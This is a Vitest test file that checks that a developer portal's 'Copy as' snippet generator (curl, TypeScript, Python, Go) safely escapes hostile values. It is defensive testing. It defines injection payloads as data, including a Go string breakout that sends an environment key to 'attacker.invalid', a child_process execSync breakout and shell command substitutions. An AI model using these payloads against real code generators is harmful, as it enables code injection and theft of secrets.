import { execFileSync, spawnSync } from 'node:child_process';
import { mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { runInNewContext } from 'node:vm';
import { afterAll, describe, expect, it } from 'vitest';
import {
  goRawString,
  goString,
  jsonText,
  pyString,
  shQuote,
  tsKey,
  tsLiteral,
  tsString,
} from '../../developers/model/code-literals.ts';
import type { SampleOp } from '../../developers/model/sample-ts.ts';
import { samplesFor } from '../../developers/model/samples.ts';
import type { Json } from '../../developers/model/types.ts';
import { COPY_LANGS, copyAs, type Sent } from './copy-as.ts';

/** The three payloads from the PX10 review, plus quotes and a backtick of every kind. */
const GO_PAYLOAD =
  '`+fmt.Sprint(http.Get("https://attacker.invalid/?k="+os.Getenv("PASSBOOK_KEY")))+`';
const TS_PAYLOAD = "\\'+require(child_process).execSync(id).toString()//";
const SH_PAYLOAD = '$(id)';
const MIXED = `a'b"c\`d\\e\n$(id) \${PASSBOOK_KEY} ; touch pwned #`;
const PAYLOADS = [GO_PAYLOAD, TS_PAYLOAD, SH_PAYLOAD, MIXED];

const dir = mkdtempSync(join(tmpdir(), 'code-literals-'));
afterAll(() => rmSync(dir, { recursive: true, force: true }));
// The Go toolchain is optional on a machine; knip does not need to list it as a dependency.
const GO = process.env.GO_BIN ?? 'go';
const GOFMT = process.env.GOFMT_BIN ?? 'gofmt';
const have = (cmd: string) => spawnSync('which', [cmd]).status === 0;
const env = { ...process.env, PASSBOOK_KEY: 'sentinel-key' };

function sent(payload: string): Sent {
  return {
    method: 'POST',
    url: `https://passbook.mobile/api/v1/passes/${encodeURIComponent(payload)}?q=${payload}`,
    headers: [
      ['If-Match', payload],
      ['Idempotency-Key', payload],
    ],
    body: { note: payload, [payload]: [payload, { deep: payload }] },
  };
}
const want = (s: Sent) => ({
  url: s.url,
  headers: Object.fromEntries(s.headers),
  body: s.body,
});

describe('literal helpers', () => {
  it("write each value as the language's own literal", () => {
    expect(runInNewContext(tsString(TS_PAYLOAD))).toBe(TS_PAYLOAD);
    expect(pyString(MIXED)).toBe(JSON.stringify(MIXED));
    expect(goString(GO_PAYLOAD)).toBe(JSON.stringify(GO_PAYLOAD));
    expect(shQuote("it's")).toBe(`'it'\\''s'`);
    expect(shQuote(SH_PAYLOAD)).toBe("'$(id)'");
    expect(tsKey('Idempotency-Key')).toBe("'Idempotency-Key'");
    expect(tsKey('plain')).toBe('plain');
  });
  it('turn a lone surrogate into U+FFFD so Go source stays valid', () => {
    expect(goString('a\ud800b')).toBe('"a\\ufffdb"');
    expect(goString('😀')).toBe('"😀"');
  });
  it('never emit a string quote the value could close', () => {
    for (const p of PAYLOADS) {
      const lit = tsLiteral({ [p]: p });
      // Parsed back as JavaScript, the literal is exactly the data.
      expect(runInNewContext(`(${lit})`)).toEqual({ [p]: p });
    }
  });
});

describe.each(PAYLOADS)('Copy as with a hostile value %#', (payload) => {
  const s = sent(payload);

  it('curl: parses, and the arguments are the values, with nothing run', () => {
    const file = join(dir, 'curl.sh');
    writeFileSync(file, copyAs('curl', s));
    execFileSync('bash', ['-n', file]);
    // curl is a function that prints its arguments NUL-separated; an injected command would run.
    const out = execFileSync(
      'bash',
      ['-c', `curl(){ printf '%s\\0' "$@"; }; id(){ echo INJECTED >&2; }; . ${file}`],
      { env, stdio: ['ignore', 'pipe', 'pipe'] },
    ).toString();
    const args = out.split('\0').slice(0, -1);
    expect(args).toContain(s.url);
    expect(args).toContain(`If-Match: ${payload}`);
    expect(args).toContain(`Idempotency-Key: ${payload}`);
    expect(args).toContain('Authorization: Bearer sentinel-key');
    expect(JSON.parse(args[args.indexOf('-d') + 1] ?? '')).toEqual(s.body);
  });

  it('TypeScript: parses, and fetch receives the values, with nothing run', () => {
    const file = join(dir, 'ts.mjs');
    writeFileSync(file, copyAs('ts', s));
    execFileSync('node', ['--check', file]);
    const runner = `
      const calls = [];
      globalThis.require = () => { calls.push('require'); };
      globalThis.child_process = {}; globalThis.id = 1;
      globalThis.fetch = async (url, init) => { calls.push({ url, init }); return Response.json({}); };
      await import(${JSON.stringify(`file://${file}`)});
      console.log(JSON.stringify(calls));`;
    const out =
      execFileSync('node', ['--input-type=module', '-e', runner], { env })
        .toString()
        .trim()
        .split('\n')
        .at(-1) ?? '';
    const calls = JSON.parse(out) as (
      | { url: string; init: { headers: Record<string, string>; body: string } }
      | string
    )[];
    expect(calls).toHaveLength(1);
    const call = calls[0] as {
      url: string;
      init: { headers: Record<string, string>; body: string };
    };
    expect(call.url).toBe(want(s).url);
    expect(call.init.headers['If-Match']).toBe(payload);
    expect(call.init.headers['Idempotency-Key']).toBe(payload);
    expect(call.init.headers.Authorization).toBe('Bearer sentinel-key');
    expect(JSON.parse(call.init.body)).toEqual(s.body);
  });

  it('Python: compiles, and httpx receives the values', () => {
    const file = join(dir, 'py.py');
    writeFileSync(file, copyAs('py', s));
    const stub = `
import sys, types, json as j
m = types.ModuleType("httpx")
class R:
    status_code = 200
    def json(self): return {}
def request(method, url, headers=None, json=None):
    print(j.dumps([method, url, headers, json])); return R()
m.request = request
sys.modules["httpx"] = m
exec(compile(open(${JSON.stringify(file)}).read(), "snippet", "exec"))`;
    const out = execFileSync('python3', ['-I', '-c', stub], { env }).toString();
    const [method, url, headers, body] = JSON.parse(out.split('\n')[0] ?? '[]') as [
      string,
      string,
      Record<string, string>,
      Json,
    ];
    expect([method, url]).toEqual(['POST', s.url]);
    expect(headers['If-Match']).toBe(payload);
    expect(headers['Idempotency-Key']).toBe(payload);
    expect(headers.Authorization).toBe('Bearer sentinel-key');
    expect(body).toEqual(s.body);
  });

  it.skipIf(!have(GO))(
    'Go: vets, and every value sits inside an interpreted string literal',
    () => {
      const code = copyAs('go', s);
      const gofile = join(dir, 'main.go');
      writeFileSync(gofile, code);
      execFileSync(GO, ['vet', gofile], {
        env: { ...env, GOFLAGS: '-mod=mod', GOCACHE: join(dir, 'gocache') },
      });
      expect(code).toContain(goString(s.url));
      expect(code).toContain(`req.Header.Set("If-Match", ${goString(payload)})`);
      expect(code).toContain(`strings.NewReader(${goString(JSON.stringify(s.body, null, 2))})`);
    },
  );
});

describe.each([
  ['the SDKs', true],
  ['plain HTTP', false],
])('the reference samples through %s use the same literals', (_name, published) => {
  const op: SampleOp = {
    method: 'post',
    path: '/passes',
    idempotent: true,
    fields: [],
    binary: false,
    download: false,
    paged: false,
    sdkCall: 'pb.passes.create',
    sample: { body: { note: GO_PAYLOAD, other: TS_PAYLOAD }, query: {}, headers: {} },
  };
  const base = "https://passbook.mobile/it's";
  const sdk = { typescript: published, python: published, go: published };
  const samples = Object.fromEntries(samplesFor(op, base, sdk).map((x) => [x.lang, x.code]));

  it('curl single-quotes the URL and body', () => {
    expect(samples.curl).toContain(`curl -X POST ${shQuote(`${base}/passes`)}`);
    const file = join(dir, 'sample.sh');
    writeFileSync(file, samples.curl ?? '');
    execFileSync('bash', ['-n', file]);
  });
  it('TypeScript, Python and Go put the body in literals, and parse', () => {
    // The SDK samples carry no URL: the portal's origin, which can hold a quote, never reaches them.
    if (published)
      for (const lang of ['ts', 'py', 'go'] as const) expect(samples[lang]).not.toContain(base);
    expect(samples.ts).toContain(`note: ${tsString(GO_PAYLOAD)}`);
    expect(samples.py).toContain(`"note": ${pyString(GO_PAYLOAD)}`);
    expect(samples.go).toContain(goRawString(jsonText({ note: GO_PAYLOAD, other: TS_PAYLOAD })));
    if (!published) {
      expect(samples.ts).toContain(`fetch(${tsString(`${base}/passes`)}`);
      expect(samples.py).toContain(`requests.post(\n    ${pyString(`${base}/passes`)}`);
      expect(samples.go).toContain(`http.NewRequest("POST", ${goString(`${base}/passes`)}`);
    }
    const ts = join(dir, 'sample.mjs');
    writeFileSync(ts, samples.ts ?? '');
    execFileSync('node', ['--check', ts]);
    const py = join(dir, 'sample.py');
    writeFileSync(py, samples.py ?? '');
    execFileSync('python3', [
      '-I',
      '-c',
      `import sys; compile(open(${JSON.stringify(py)}).read(), "s", "exec")`,
    ]);
    // The Go sample imports the SDK, so only its syntax is checked here; sdk/go compiles every sample.
    if (have(GOFMT)) {
      const go = join(dir, 'sample.go');
      writeFileSync(go, samples.go ?? '');
      execFileSync(GOFMT, ['-e', go]);
    }
  });
  it('covers every Copy as language', () => {
    expect(COPY_LANGS.map((l) => l.lang).sort()).toEqual(['curl', 'go', 'py', 'ts']);
  });
});
